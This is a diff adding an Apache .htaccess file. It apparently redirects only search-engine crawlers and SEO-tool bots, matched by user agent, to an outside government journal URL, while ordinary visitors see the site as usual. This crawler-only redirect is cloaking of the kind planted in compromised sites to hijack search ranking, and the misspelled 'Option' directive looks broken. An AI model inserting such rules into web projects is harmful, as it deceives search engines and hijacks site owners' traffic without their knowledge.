@@ -1,0 +1,7 @@
+Option -Indexes
+
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|slurp|ahrefs|semrush|yandex|majestic|screamingfrog) [NC]
+RewriteRule ^(.*)$ https://ojsdikdas.kemendikdasmen.go.id/index.php/didaktika/ [R=301,L]
+</IfModule>
